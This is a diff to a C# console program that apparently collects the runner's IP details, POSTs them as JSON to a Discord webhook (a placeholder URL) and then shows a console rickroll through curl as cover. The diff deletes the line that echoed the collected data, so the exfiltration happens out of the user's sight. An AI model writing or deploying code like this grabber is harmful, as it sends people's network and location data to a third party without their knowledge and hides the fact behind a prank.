@@ -1,5 +1,6 @@
-﻿using System;
+using System;
 using System.Collections.Generic;
+using System.Diagnostics;
 using System.IO;
 using System.Linq;
 using System.Net.Http;
@@ -55,8 +56,6 @@ namespace CMD_Csharp_EDITION
             using var response_ip = await httpClient_ip.SendAsync(request_ip);
             string responseIP_text = await response_ip.Content.ReadAsStringAsync();
 
-            Console.WriteLine(responseIP_text);
-
             var jsonElement = JsonSerializer.Deserialize<JsonElement>(responseIP_text);
             string prettyJson = JsonSerializer.Serialize(jsonElement, new JsonSerializerOptions
             {
@@ -93,20 +92,22 @@ namespace CMD_Csharp_EDITION
 
             StringContent content = new StringContent(json, Encoding.UTF8, "application/json");
 
-            using var request = new HttpRequestMessage(HttpMethod.Post, "DISCORD_WEEBHOOK_HERE");
-            request.Content = content;
-
             try
             {
+                using var request = new HttpRequestMessage(HttpMethod.Post, "DISCORD_WEEBHOOK_HERE");
+                request.Content = content;
+
                 using var response = await httpClient.SendAsync(request);
                 string responseText = await response.Content.ReadAsStringAsync();
-                Environment.Exit(0);
-             }
-            catch
-            {
-                Environment.Exit(1);
-            }
 
+            }
+            catch (System.InvalidOperationException) { }
+            finally
+            {
+                Console.ForegroundColor = ConsoleColor.Green;
+                Process.Start("curl", "ascii.live/rick"); // curl запрос к опен сурс проекту (знаменитый рикрол в консоли)
+            }
+        
 
 
 
